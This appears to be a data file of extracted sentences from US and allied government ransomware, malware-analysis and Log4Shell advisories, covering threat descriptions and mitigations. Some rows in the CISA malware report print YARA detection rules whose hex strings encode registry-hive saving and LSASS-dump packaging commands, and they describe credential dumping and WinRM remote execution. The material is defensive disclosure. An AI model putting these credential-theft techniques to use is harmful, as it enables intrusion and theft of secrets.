CAND_00902,R019,1,R019_P0002,R019_S000002,"When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact."
CAND_00903,R019,1,R019_P0003,R019_S000008,"TLP: WHITE Product ID: AA22-294A October 21, 2022 TLP:WHITE Co-Authored by: #StopRansomware: Daixin Team SUMMARY Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors."
CAND_00904,R019,1,R019_P0003,R019_S000009,"These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware."
CAND_00905,R019,1,R019_P0003,R019_S000010,Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
CAND_00906,R019,1,R019_P0003,R019_S000013,This joint CSA provides TTPs and IOCs of Daixin actors obtained from FBI threat response activities and third-party reporting.
CAND_00907,R019,1,R019_P0003,R019_S000017,"Actions to take today to mitigate cyber threats from ransomware: • Install updates for operating systems, software, and firmware as soon as they are released."
CAND_00908,R019,1,R019_P0003,R019_S000019,• Train users to recognize and report phishing attempts.
CAND_00909,R019,2,R019_P0002,R019_S000020,"FBI | CISA | HHS TLP:WHITE Page 2 of 10 | Product ID: AA22-294A TLP: WHITE • According to an IC3 annual report in 2021, 649 ransomware reports were made across 14 critical infrastructure sectors; the HPH Sector accounted for the most reports at 148."
CAND_00910,R019,2,R019_P0002,R019_S000021,The Daixin Team is a ransomware and data extortion group that has targeted the HPH Sector with ransomware and data extortion operations since at least June 2022.
CAND_00911,R019,2,R019_P0002,R019_S000028,Daixin actors have sought to gain privileged account access through credential dumping [T1003] and pass the hash [T1550.002].
CAND_00912,R019,2,R019_P0002,R019_S000030,The actors have then used SSH to connect to accessible ESXi servers and deploy ransomware [T1486] on those servers.
CAND_00913,R019,2,R019_P0002,R019_S000031,"According to third-party reporting, the Daixin Team’s ransomware is based on leaked Babuk Locker source code."
CAND_00914,R019,2,R019_P0002,R019_S000032,"This third-party reporting as well as FBI analysis show that the ransomware targets ESXi servers and encrypts files located in /vmfs/volumes/ with the following extensions: .vmdk, .vmem, .vswp, .vmsd, .vmx, and .vmsn."
CAND_00915,R019,2,R019_P0002,R019_S000033,A ransom note is also written to /vmfs/volumes/.
CAND_00916,R019,2,R019_P0002,R019_S000036,"Note that in the Figure 3 ransom note, Daixin actors misspell “Daixin” as “Daxin.”"
CAND_00917,R019,3,R019_P0003,R019_S000039,Figure 2: Daixin Team – Ransomware Targeted File Extensions
CAND_00918,R019,3,R019_P0004,R019_S000040,Figure 3: Example 1 of Daixin Team Ransomware Note
CAND_00919,R019,4,R019_P0003,R019_S000046,Table 1: Daixin Actors’ ATT&CK Techniques for Enterprise Reconnaissance Technique Title ID Use Phishing for Information: Spearphishing Attachment T1598.002 Daixin actors have acquired the VPN credentials (later used for initial access) by a phishing email with a malicious attachment.
CAND_00920,R019,5,R019_P0002,R019_S000048,FBI | CISA | HHS TLP:WHITE Page 5 of 10 | Product ID: AA22-294A TLP: WHITE Valid Accounts T1078 Daixin actors use previously compromised credentials to access servers on the target network.
CAND_00921,R019,5,R019_P0002,R019_S000050,Credential Access Technique Title ID Use OS Credential Dumping T1003 Daixin actors have sought to gain privileged account access through credential dumping.
CAND_00922,R019,6,R019_P0003,R019_S000057,INDICATORS OF COMPROMISE See Table 2 for IOCs obtained from third-party reporting.
CAND_00923,R019,7,R019_P0002,R019_S000061,FBI | CISA | HHS TLP:WHITE Page 7 of 10 | Product ID: AA22-294A TLP: WHITE exploited vulnerabilities.
CAND_00924,R019,7,R019_P0002,R019_S000063,"• Require phishing-resistant MFA for as many services as possible—particularly for webmail, VPNs, accounts that access critical systems, and privileged accounts that manage backups."
CAND_00925,R019,7,R019_P0002,R019_S000065,"o Limit access to resources over internal networks, especially by restricting RDP and using virtual desktop infrastructure."
CAND_00926,R019,7,R019_P0002,R019_S000066,"After assessing risks, if RDP is deemed operationally necessary, restrict the originating sources, and require multifactor authentication (MFA) to mitigate credential theft and reuse."
CAND_00927,R019,7,R019_P0002,R019_S000067,"If RDP must be available externally, use a virtual private network (VPN), virtual desktop infrastructure, or other means to authenticate and secure the connection before allowing RDP to connect to internal devices."
CAND_00928,R019,7,R019_P0002,R019_S000072,• Implement and enforce multi-layer network segmentation with the most critical communications and data resting on the most secure and reliable layer.
CAND_00929,R019,7,R019_P0002,R019_S000073,"• Limit access to data by deploying public key infrastructure and digital certificates to authenticate connections with the network, Internet of Things (IoT) medical devices, and the electronic health record system, as well as to ensure data packages are not manipulated while in transit from man-in-the-middle attacks."
CAND_00930,R019,7,R019_P0002,R019_S000076,"Only store personal patient data on internal systems that are protected by firewalls, and ensure extensive backups are available if data is ever compromised."
CAND_00931,R019,7,R019_P0002,R019_S000080,• Use monitoring tools to observe whether IoT devices are behaving erratically due to a compromise.
CAND_00932,R019,8,R019_P0002,R019_S000083,"Preparing for Ransomware • Maintain offline (i.e., physically disconnected) backups of data, and regularly test backup and restoration."
CAND_00933,R019,8,R019_P0002,R019_S000084,These practices safeguard an organization’s continuity of operations or at least minimize potential downtime from a ransomware incident and protect against data losses.
CAND_00934,R019,8,R019_P0002,R019_S000085,"o Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure."
CAND_00935,R019,8,R019_P0002,R019_S000088,Ensure the notification procedures adhere to applicable state laws.
CAND_00936,R019,8,R019_P0002,R019_S000090,"▪ For breaches involving electronic health information, you may need to notify the Federal Trade Commission (FTC) or the Department of Health and Human Services, and—in some cases—the media."
CAND_00937,R019,8,R019_P0002,R019_S000092,Department of Health and Human Services’ Breach Notification Rule for more information.
CAND_00938,R019,9,R019_P0002,R019_S000102,Reinforce the appropriate user response to phishing and spearphishing emails.
CAND_00939,R019,9,R019_P0002,R019_S000103,• Use strong passwords and avoid reusing passwords for multiple accounts.
CAND_00940,R019,9,R019_P0002,R019_S000104,See CISA Tip Choosing and Protecting Passwords and the National Institute of Standards and Technology’s (NIST’s) Special Publication 800-63B: Digital Identity Guidelines for more information.
CAND_00941,R019,9,R019_P0002,R019_S000105,• Require administrator credentials to install software.
CAND_00942,R019,9,R019_P0002,R019_S000106,• Audit user accounts with administrative or elevated privileges and configure access controls with least privilege in mind.
CAND_00943,R019,9,R019_P0002,R019_S000108,• Only use secure networks and avoid using public Wi-Fi networks.
CAND_00944,R019,9,R019_P0002,R019_S000113,• Scan backups.
CAND_00945,R019,9,R019_P0002,R019_S000114,"If possible, scan backup data with an antivirus program to check that it is free of malware."
CAND_00946,R019,9,R019_P0002,R019_S000116,• Follow the notification requirements as outlined in your cyber incident response plan.
CAND_00947,R019,9,R019_P0002,R019_S000117,"• Report incidents to the FBI at a local FBI Field Office, CISA at cisa.gov/report, or the U.S."
CAND_00948,R019,9,R019_P0002,R019_S000121,"Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities."
CAND_00949,R019,9,R019_P0002,R019_S000123,• Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.
CAND_00950,R019,10,R019_P0002,R019_S000128,DISCLAIMER The information in this report is being provided “as is” for informational purposes only.
CAND_00951,R020,1,R020_P0001,R020_S000003,Cybersecurity_Requests@nsa.gov.
CAND_00952,R020,1,R020_P0001,R020_S000005,"TLP: WHITE 2021 Trends Show Increased Globalized Threat of Ransomware SUMMARY In 2021, cybersecurity authorities in the United States,[1][2][3] Australia,[4] and the United Kingdom[5] observed an increase in sophisticated, high-impact ransomware incidents against critical infrastructure organizations globally."
CAND_00953,R020,2,R020_P0001,R020_S000026,"FBI | CISA | ACSC | NCSC-UK TLP:WHITE Page 2 of 9 | Product ID: AA22-040A TLP: WHITE Ransomware tactics and techniques continued to evolve in 2021, which demonstrates ransomware threat actors’ growing technological sophistication and an increased ransomware threat to organizations globally."
CAND_00954,R020,2,R020_P0001,R020_S000030,"Once a ransomware threat actor has gained code execution on a device or network access, they can deploy ransomware."
CAND_00955,R020,2,R020_P0001,R020_S000031,Note: these infection vectors likely remain popular because of the increased use of remote work and schooling starting in 2020 and continuing through 2021.
CAND_00956,R020,2,R020_P0001,R020_S000034,"The market for ransomware became increasingly “professional” in 2021, and the criminal business model of ransomware is now well established."
CAND_00957,R020,2,R020_P0001,R020_S000036,NCSC-UK observed that some ransomware threat actors offered their victims the services of a 24/7 help center to expedite ransom payment and restoration of encrypted systems or data.
CAND_00958,R020,2,R020_P0001,R020_S000041,"Eurasian ransomware groups have shared victim information with each other, diversifying the threat to targeted organizations."
CAND_00959,R020,3,R020_P0002,R020_S000044,"FBI | CISA | ACSC | NCSC-UK TLP:WHITE Page 3 of 9 | Product ID: AA22-040A TLP: WHITE ransomware actors began selling access to victims’ networks, enabling follow-on attacks by other cyber threat actors."
CAND_00960,R020,3,R020_P0002,R020_S000047,"These victims included Colonial Pipeline Company, JBS Foods, and Kaseya Limited."
CAND_00961,R020,3,R020_P0002,R020_S000052,"o NCSC-UK observed targeting of UK organizations of all sizes throughout the year, with some “big game” victims."
CAND_00962,R020,3,R020_P0002,R020_S000056,The ACSC continued to observe “double extortion” incidents in which a threat actor uses a combination of encryption and data theft to pressure victims to pay ransom demands.
CAND_00963,R020,3,R020_P0002,R020_S000061,Ransomware threat actors have also targeted cloud service providers to encrypt large amounts of customer data.
CAND_00964,R020,3,R020_P0002,R020_S000062,• Targeting managed service providers.
CAND_00965,R020,3,R020_P0002,R020_S000065,"By compromising an MSP, a ransomware threat actor could access multiple victims through one initial compromise."
CAND_00966,R020,4,R020_P0002,R020_S000072,Targeting software supply chains allows ransomware threat actors to increase the scale of their attacks by accessing multiple victims through a single initial compromise.
CAND_00967,R020,4,R020_P0002,R020_S000074,The FBI and CISA observed cybercriminals conducting increasingly impactful attacks against U.S.
CAND_00968,R020,4,R020_P0002,R020_S000075,entities on holidays and weekends throughout 2021.
CAND_00969,R020,4,R020_P0002,R020_S000079,Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats.
CAND_00970,R020,4,R020_P0002,R020_S000082,Automate software security scanning and testing when possible.
CAND_00971,R020,4,R020_P0002,R020_S000086,"After assessing risks, if RDP is deemed operationally necessary, restrict the originating sources and require MFA to mitigate credential theft and reuse."
CAND_00972,R020,5,R020_P0002,R020_S000093,FBI | CISA | ACSC | NCSC-UK TLP:WHITE Page 5 of 9 | Product ID: AA22-040A TLP: WHITE o Review the security posture of third-party vendors and those interconnected with your organization.
CAND_00973,R020,5,R020_P0002,R020_S000094,Ensure all connections between third-party vendors and outside software or hardware are monitored and reviewed for suspicious activity.
CAND_00974,R020,5,R020_P0002,R020_S000097,"• Implement a user training program and phishing exercises to raise awareness among users about the risks of visiting suspicious websites, clicking on suspicious links, and opening suspicious attachments."
CAND_00975,R020,5,R020_P0002,R020_S000105,"• Protect cloud storage by backing up to multiple locations, requiring MFA for access, and encrypting data in the cloud."
CAND_00976,R020,5,R020_P0002,R020_S000109,Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement.
CAND_00977,R020,5,R020_P0002,R020_S000111,"For example, the ACSC has observed ransomware and data theft incidents in which Australian divisions of multinational companies were impacted by ransomware incidents affecting assets maintained and hosted by offshore divisions (outside their control)."
CAND_00978,R020,6,R020_P0002,R020_S000114,"FBI | CISA | ACSC | NCSC-UK TLP:WHITE Page 6 of 9 | Product ID: AA22-040A TLP: WHITE • Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a network-monitoring tool."
CAND_00979,R020,6,R020_P0002,R020_S000118,• Document external remote connections.
CAND_00980,R020,6,R020_P0002,R020_S000123,"For example, the just-in-time access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the zero trust model) by setting network-wide policy to automatically disable admin accounts at the Active Directory level."
CAND_00981,R020,6,R020_P0002,R020_S000127,Minimize unnecessary privileges for identities.
CAND_00982,R020,6,R020_P0002,R020_S000129,"In cloud environments, non-person identities (service accounts or roles) with excessive privileges are a key vector for lateral movement and data access."
CAND_00983,R020,6,R020_P0002,R020_S000131,• Reduce credential exposure.
CAND_00984,R020,6,R020_P0002,R020_S000137,Organizations should also disable macros sent from external sources via Group Policy.
CAND_00985,R020,6,R020_P0002,R020_S000138,"• Maintain offline (i.e., physically disconnected) backups of data, and regularly test backup and restoration."
CAND_00986,R020,7,R020_P0002,R020_S000142,"FBI | CISA | ACSC | NCSC-UK TLP:WHITE Page 7 of 9 | Product ID: AA22-040A TLP: WHITE • Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure."
CAND_00987,R020,7,R020_P0002,R020_S000146,"Ensure that telemetry from cloud environments—including network telemetry (e.g., virtual private cloud [VPC] flow logs), identity telemetry (e.g., account sign-on, token usage, federation configuration changes), and application telemetry (e.g., file downloads, cross-organization sharing)—is retained and visible to the security team."
CAND_00988,R020,7,R020_P0002,R020_S000150,• Scan backups.
CAND_00989,R020,7,R020_P0002,R020_S000157,o Australian organizations should report incidents to the ASD’s ACSC via cyber.gov.au or call 1300 292 371 (1300 CYBER 1).
CAND_00990,R020,7,R020_P0002,R020_S000158,"o UK organizations should report incidents to NCSC-UK via report.ncsc.gov.uk and/or Action Fraud, the United Kingdom’s fraud and cyber reporting centre, via actionfraud.police.uk."
CAND_00991,R020,7,R020_P0002,R020_S000161,"Criminal activity is motivated by financial gain, so paying a ransom may embolden adversaries to target additional organizations (or re-target the same organization) or encourage cyber criminals to engage in the distribution of ransomware."
CAND_00992,R020,7,R020_P0002,R020_S000162,Paying the
CAND_00993,R020,8,R020_P0002,R020_S000164,"Additionally, reducing the financial gain of ransomware threat actors will help disrupt the ransomware criminal business model."
CAND_00994,R020,8,R020_P0002,R020_S000166,"In instances where a ransom paid, victim organizations often cease engagement with authorities, who then lose visibility of the payments made."
CAND_00995,R020,8,R020_P0002,R020_S000169,whole-of-government webpage providing ransomware resources and alerts.
CAND_00996,R020,8,R020_P0002,R020_S000173,• The U.S.
CAND_00997,R020,8,R020_P0002,R020_S000174,Department of State’s Rewards for Justice (RFJ) program offers a reward of up to $10 million for reports of foreign government malicious activity against U.S.
CAND_00998,R020,8,R020_P0002,R020_S000176,See the RFJ website for more information and how to report information securely.
CAND_00999,R020,8,R020_P0002,R020_S000178,"These strategies, known as the “Essential Eight,” make it much harder for adversaries to compromise systems."
CAND_01000,R020,8,R020_P0002,R020_S000179,• Refer to the ACSC’s practical guides on how to protect yourself against ransomware attacks and what to do if you are held to ransom at cyber.gov.au.
CAND_01001,R021,1,R021_P0001,R021_S000001,"TLP: CLEAR TLP: CLEAR Notification This report is provided ""as is"" for informational purposes only."
CAND_01002,R021,1,R021_P0001,R021_S000002,The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained herein.
CAND_01003,R021,1,R021_P0001,R021_S000003,The DHS does not endorse any commercial product or service referenced in this bulletin or otherwise.
CAND_01004,R021,1,R021_P0001,R021_S000007,"For more information on the Traffic Light Protocol (TLP), see http://www.cisa.gov/tlp."
CAND_01005,R021,1,R021_P0001,R021_S000009,"The files include: • Windows Batch file (.bat) • Windows Executable (.exe) • Windows Dynamic Link Library (.dll) • Python Script (.py) Submitted Files (4) 17a27b1759f10d1f6f1f51a11c0efea550e2075c2c394259af4d3f855bbcc994 (a.dll) 906602ea3c887af67bcb4531bbbb459d7c24a2efcb866bcb1e3b028a51f12ae6 (a.py) 98e79f95cf8de8ace88bf223421db5dce303b112152d66ffdf27ebdfcdf967e9 (a.bat) e557e1440e394537cca71ed3d61372106c3c70eb6ef9f07521768f23a0974068 (a.exe) Findings 98e79f95cf8de8ace88bf223421db5dce303b112152d66ffdf27ebdfcdf967e9 Details Name a.bat Size 376 bytes Type DOS batch file, ASCII text, with CRLF line terminators MD5 52d5e2a07cd93c14f1ba170e3a3d6747 SHA1 8acaf9908229871ab33033df7b6a328ec1db56d5 SHA256 98e79f95cf8de8ace88bf223421db5dce303b112152d66ffdf27ebdfcdf967e9 SHA512 317414f28d34f8295aa76cf9f39d4fd42c9bad292458dbd2a19f08a6a8b451e271179b7ef78afd8a2fe92a2e1103d9ef5e 220557febf42d91900c268b8d61b69 Malware Analysis Report 10478915.r1.v1 2023-11-16 CISA MAR-10478915.r1.v1.CLEAR 1 of 8"
CAND_01006,R021,2,R021_P0001,R021_S000011,"YARA Rules • rule CISA_10478915_01 : trojan installs_other_components { meta: author = ""CISA Code & Media Analysis"" incident = ""10478915"" date = ""2023-11-06"" last_modified = ""20231108_1500"" actor = ""n/a"" family = ""n/a"" capabilities = ""installs-other-components"" malware_Type = ""trojan"" tool_type = ""information-gathering"" description = ""Detects trojan .bat samples"" sha256 = ""98e79f95cf8de8ace88bf223421db5dce303b112152d66ffdf27ebdfcdf967e9"" strings: $s1 = { 63 3a 5c 77 69 6e 64 6f 77 73 5c 74 61 73 6b 73 5c 7a 2e 74 78 74 } $s2 = { 72 65 67 20 73 61 76 65 20 68 6b 6c 6d 5c 73 79 73 74 65 6d 20 63 3a 5c 77 69 6e 64 6f 77 73 5c 74 61 73 6b 73 5c 65 6d } $s3 = { 6d 61 6b 65 63 61 62 20 63 3a 5c 75 73 65 72 73 5c 70 75 62 6c 69 63 5c 61 2e 70 6e 67 20 63 3a 5c 77 69 6e 64 6f 77 73 5c 74 61 73 6b 73 5c 61 2e 63 61 62 } condition: all of them } ssdeep Matches No matches found."
CAND_01007,R021,2,R021_P0001,R021_S000013,Related_To e557e1440e394537cca71ed3d61372106c3c7 0eb6ef9f07521768f23a0974068 98e79f95cf...
CAND_01008,R021,2,R021_P0001,R021_S000015,The output is printed to a file named 'z.txt' located in the path C:\Windows\Tasks.
CAND_01009,R021,2,R021_P0001,R021_S000017,The next command it runs is reg save to save the HKLM\SYSTEM registry hive into the C:\Windows\tasks\em directory.
CAND_01010,R021,3,R021_P0001,R021_S000022,- This is the full contents of the file a.bat.
CAND_01011,R021,3,R021_P0001,R021_S000023,"e557e1440e394537cca71ed3d61372106c3c70eb6ef9f07521768f23a0974068 Tags trojan Details Name a.exe Size 145920 bytes Type PE32+ executable (console) x86-64, for MS Windows MD5 37f7241963cf8279f7c1d322086a5194 SHA1 ec401ae8ddebef4038cedb65cc0d5ba6c1fdef28 SHA256 e557e1440e394537cca71ed3d61372106c3c70eb6ef9f07521768f23a0974068 SHA512 02c2473b90ba787fea41a9840c7dc9a9869685ca8fdca3521278e0cc986e1797e36552f41f1ac206f5ec5bdc0ac40f13c d36217aea3aad13518e9764ea92c1f7 ssdeep 3072:u8txkT6wDLf/p3ufznQbCQVlvxxV5hmWIh:NgpDbZufLQpjxJ9U Entropy 6.094246 Antivirus Antiy Trojan/Win64.Malgent Avira TR/Redcap.sbphc Bitdefender Trojan.GenericKD.70103917 Emsisoft Trojan.GenericKD.70103917 (B) IKARUS Trojan.Win64.Malgent K7 Riskware ( 00584baa1 ) YARA Rules • rule CISA_10478915_02 : trojan installs_other_components { meta: author = ""CISA Code & Media Analysis"" incident = ""10478915"" date = ""2023-11-06"" last_modified = ""20231108_1500"" actor = ""n/a"" family = ""n/a"" capabilities = ""installs-other-components"" malware_type = ""trojan"" tool_type = ""unknown"" description = ""Detects trojan PE32 samples"" sha256 = ""e557e1440e394537cca71ed3d61372106c3c70eb6ef9f07521768f23a0974068"" strings: CISA MAR-10478915.r1.v1.CLEAR 3 of 8"
CAND_01012,R021,4,R021_P0001,R021_S000025,Relationships e557e1440e...
CAND_01013,R021,4,R021_P0001,R021_S000028,This file issues the Remote Procedure Call (RPC) ncalrpc:[lsasspirpc] to the RPC end point to provide a file path to the LSASS on the infected machine.
CAND_01014,R021,4,R021_P0001,R021_S000029,"Once the file path is returned, the malware loads the accompanying DLL file called a.dll into the running LSASS process."
CAND_01015,R021,4,R021_P0001,R021_S000030,"If the DLL is correctly loaded, then the malware outputs the message ""[*]success"" in the console."
CAND_01016,R021,4,R021_P0001,R021_S000032,Trojan.Agent.Win64.39686 YARA Rules CISA MAR-10478915.r1.v1.CLEAR 4 of 8
CAND_01017,R021,5,R021_P0001,R021_S000034,Relationships 17a27b1759...
CAND_01018,R021,5,R021_P0001,R021_S000035,Related_To e557e1440e394537cca71ed3d61372106c3c7 0eb6ef9f07521768f23a0974068 17a27b1759...
CAND_01019,R021,5,R021_P0001,R021_S000036,Related_To 98e79f95cf8de8ace88bf223421db5dce303b11 2152d66ffdf27ebdfcdf967e9 Description This file is a 64-bit Windows DLL called a.dll that is executed by a.bat as a parameter for the file a.exe.
CAND_01020,R021,5,R021_P0001,R021_S000040,"If successful, the dumped process memory is written to a.png."
CAND_01021,R021,5,R021_P0001,R021_S000042,Screenshots Figure 2.
CAND_01022,R021,5,R021_P0001,R021_S000043,"- This is the call to the register R14, which contains the MiniDumpWriteDump function that is being leveraged to dump the LSASS process memory to disk."
CAND_01023,R021,5,R021_P0001,R021_S000044,906602ea3c887af67bcb4531bbbb459d7c24a2efcb866bcb1e3b028a51f12ae6 CISA MAR-10478915.r1.v1.CLEAR 5 of 8
CAND_01024,R021,6,R021_P0001,R021_S000045,"TLP: CLEAR TLP: CLEAR Details Name a.py Size 2645 bytes Type Python script, ASCII text executable, with CRLF line terminators MD5 9cff554fa65c1b207da66683b295d4ad SHA1 b8e74921d7923c808a0423e6e46807c4f0699b6e SHA256 906602ea3c887af67bcb4531bbbb459d7c24a2efcb866bcb1e3b028a51f12ae6 SHA512 131621770e1899d81e6ff312b3245fe4e4013c36f82818a82fdd319982e6b742a72d906b6fb86c422bb720cd648f927b9 05a8fc193299ad7d8b3947e766abbd3 ssdeep 48:BpsnUP6s3ceBg5YbFYNXEtUyzzYyUyh0+FVzYA6P+Fqbaug9trYhTHhIQG86w09:BuUP6sseBIOqXEvpcrb89Z2T HCQ6P Entropy 4.748972 Antivirus No matches found."
CAND_01025,R021,6,R021_P0001,R021_S000049,"If the keyword ""hashpasswd"" is not present, then the script attempts to authenticate using basic authentication."
CAND_01026,R021,6,R021_P0001,R021_S000050,"Once a WinRM session is established with the remote machine, the script has the ability to execute command line arguments on the remote machine."
CAND_01027,R021,6,R021_P0001,R021_S000051,"If there is no command specified, then a default command of “whoami” is run."
CAND_01028,R021,7,R021_P0001,R021_S000055,Figure 4.
CAND_01029,R021,7,R021_P0001,R021_S000056,"- This is the function showing how the script decides between using NTLM or basic authentication based on the keyword ""hashpasswd""."
CAND_01030,R021,7,R021_P0001,R021_S000059,Related_To 17a27b1759f10d1f6f1f51a11c0efea550e2075 c2c394259af4d3f855bbcc994 e557e1440e...
CAND_01031,R021,7,R021_P0001,R021_S000060,Related_To 17a27b1759f10d1f6f1f51a11c0efea550e2075 c2c394259af4d3f855bbcc994 e557e1440e...
CAND_01032,R021,7,R021_P0001,R021_S000061,Related_To 98e79f95cf8de8ace88bf223421db5dce303b11 2152d66ffdf27ebdfcdf967e9 17a27b1759...
CAND_01033,R021,7,R021_P0001,R021_S000063,Related_To 98e79f95cf8de8ace88bf223421db5dce303b11 2152d66ffdf27ebdfcdf967e9 Recommendations CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems.
CAND_01034,R021,7,R021_P0001,R021_S000064,Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.
CAND_01035,R021,7,R021_P0001,R021_S000066,• Keep operating system patches up-to-date.
CAND_01036,R021,7,R021_P0001,R021_S000068,"If these services are required, use strong passwords or Active Directory authentication."
CAND_01037,R021,7,R021_P0001,R021_S000070,Do not add users to the local administrators group unless required.
CAND_01038,R021,8,R021_P0001,R021_S000076,TLP: CLEAR TLP: CLEAR matches the file header).
CAND_01039,R021,8,R021_P0001,R021_S000080,• Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).
CAND_01040,R021,8,R021_P0001,R021_S000081,"Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, ""Guide to Malware Incident Prevention & Handling for Desktops and Laptops""."
CAND_01041,R021,8,R021_P0001,R021_S000082,Contact Information • 1-888-282-0870 • CISA Service Desk (UNCLASS) • CISA SIPR (SIPRNET) • CISA IC (JWICS) CISA continuously strives to improve its products and services.
CAND_01042,R021,8,R021_P0001,R021_S000083,You can help by answering a very short series of questions about this product at the following URL: https://us-cert.cisa.gov/forms/feedback/ Document FAQ What is a MIFR?
CAND_01043,R021,8,R021_P0001,R021_S000085,In most instances this report will provide initial indicators for computer and network defense.
CAND_01044,R021,8,R021_P0001,R021_S000087,What is a MAR?
CAND_01045,R021,8,R021_P0001,R021_S000088,A Malware Analysis Report (MAR) is intended to provide organizations with more detailed malware analysis acquired via manual reverse engineering.
CAND_01046,R021,8,R021_P0001,R021_S000089,"To request additional analysis, please contact CISA and provide information regarding the level of desired analysis."
CAND_01047,R021,8,R021_P0001,R021_S000091,This document is not to be edited in any way by recipients.
CAND_01048,R021,8,R021_P0001,R021_S000092,All comments or questions related to this document should be directed to the CISA at 1-888-282-0870 or CISA Service Desk.
CAND_01049,R021,8,R021_P0001,R021_S000094,"Malware samples can be submitted via three methods: • Web: https://malware.us-cert.gov • E-Mail: submit@malware.us-cert.gov • FTP: ftp.malware.us-cert.gov (anonymous) CISA encourages you to report any suspicious activity, including cybersecurity incidents, possible malicious code, software vulnerabilities, and phishing-related scams."
CAND_01050,R021,8,R021_P0001,R021_S000095,Reporting forms can be found on CISA's homepage at www.cisa.gov.
CAND_01051,R022,1,R022_P0003,R022_S000006,NCSC.govt.nz ncsc.gov.uk/report-an-incident cisa.gov/tlp/.
CAND_01052,R022,1,R022_P0004,R022_S000011,"To request incident response resources or technical assistance related to these threats, contact CISA at For NSA client requirements or general cybersecurity inquiries, contact the Cybersecurity Requirements Center at 410-854-4200 or Australian organizations can visit or call 1300 292 371 (1300 CYBER 1) to report cybersecurity incidents and access alerts and advisories."
CAND_01053,R022,1,R022_P0004,R022_S000014,This document is marked TLP:WHITE.
CAND_01054,R022,2,R022_P0002,R022_S000019,CISA | FBI |NSA | ACSC | CCCS | CERT NZ | NZ NCSC | NCSC-UK TLP:WHITE Page 2 of 11 | Product ID: AA21-356A TLP:WHITE FBI.
CAND_01055,R022,2,R022_P0002,R022_S000027,These vulnerabilities are likely to be exploited over an extended period.
CAND_01056,R022,2,R022_P0002,R022_S000028,"CISA, the FBI, NSA, ACSC, CCCS, CERT NZ, NZ NCSC, and NCSC-UK strongly urge all organizations to apply the recommendations in the Mitigations section."
CAND_01057,R022,2,R022_P0002,R022_S000031,"CISA, the FBI, NSA, ACSC, CCCS, CERT NZ, NZ NCSC, and NCSC-UK will update this CSA as we learn more about this exploitation and have further guidance to impart."
CAND_01058,R022,2,R022_P0002,R022_S000035,"TECHNICAL DETAILS Log4Shell Log4Shell, disclosed on December 10, 2021, is a remote code execution (RCE) vulnerability affecting Apache’s Log4j library, versions 2.0-beta9 to 2.14.1."
CAND_01059,R022,2,R022_P0002,R022_S000036,The vulnerability exists in the action the Java
CAND_01060,R022,3,R022_P0002,R022_S000038,"Affected versions of Log4j contain JNDI features—such as message lookup substitution—that do not protect against adversary- controlled Lightweight Directory Access Protocol (LDAP), Domain Name System (DNS), and other JNDI related endpoints."
CAND_01061,R022,3,R022_P0002,R022_S000050,"According to public reporting, exploitation of Log4Shell began on or around December 1, 2021, and a proof-of-concept exploit is publicly available for this vulnerability."
CAND_01062,R022,3,R022_P0002,R022_S000052,The FBI assesses this vulnerability may be exploited by sophisticated cyber threat actors and incorporated into existing cyber criminal schemes that are looking to adopt increasingly sophisticated obfuscation techniques.
CAND_01063,R022,4,R022_P0002,R022_S000057,"CISA | FBI |NSA | ACSC | CCCS | CERT NZ | NZ NCSC | NCSC-UK TLP:WHITE Page 4 of 11 | Product ID: AA21-356A TLP:WHITE MITIGATIONS Vendors CISA, the FBI, NSA, ACSC, CCCS, CERT NZ, NZ NCSC, and NCSC-UK encourage vendors to: 1."
CAND_01064,R022,4,R022_P0002,R022_S000059,a.
CAND_01065,R022,4,R022_P0002,R022_S000062,"For environments using Java 7, upgrade to Log4j version 2.12.3 (released December 21, 2021)."
CAND_01066,R022,4,R022_P0002,R022_S000063,Note: Java 7 is currently end of life and organizations should upgrade to Java 8.
CAND_01067,R022,4,R022_P0002,R022_S000069,"Affected Organizations with IT and Cloud Assets CISA, the FBI, NSA, ACSC, CCCS, CERT NZ, NZ NCSC, and NCSC-UK recommend that affected organizations take the following steps to patch these vulnerabilities in their IT and cloud assets and initiate threat hunting to detect possible compromise."
CAND_01068,R022,4,R022_P0002,R022_S000070,Organizations with OT/ICS environments should review the Organizations with OT/ICS Assets section for additional guidance.
CAND_01069,R022,4,R022_P0002,R022_S000077,Inventory all assets that make use of the Log4j Java library.
CAND_01070,R022,4,R022_P0002,R022_S000079,"To avoid missing such defense evasion, organizations should carefully track assets under investigation."
CAND_01071,R022,4,R022_P0002,R022_S000081,"(2) Ensure the inventory includes all assets, including cloud assets, regardless of function, operating system, or make."
CAND_01072,R022,5,R022_P0003,R022_S000092,"• For guidance on using Canary Token to test for callback, see Thinkst Canary’s Twitter thread on using Canary Tokens."
CAND_01073,R022,5,R022_P0003,R022_S000101,The method of isolation that you should use depends on the criticality of the asset.
CAND_01074,R022,6,R022_P0002,R022_S000103,"CISA | FBI |NSA | ACSC | CCCS | CERT NZ | NZ NCSC | NCSC-UK TLP:WHITE Page 6 of 11 | Product ID: AA21-356A TLP:WHITE • Blocking at the network layer (a switch or some other device); • Implementing a firewall (including web application firewall) with strict port control and logging; or • Restricting the asset’s communication, especially to the internet and the rest of the enterprise network."
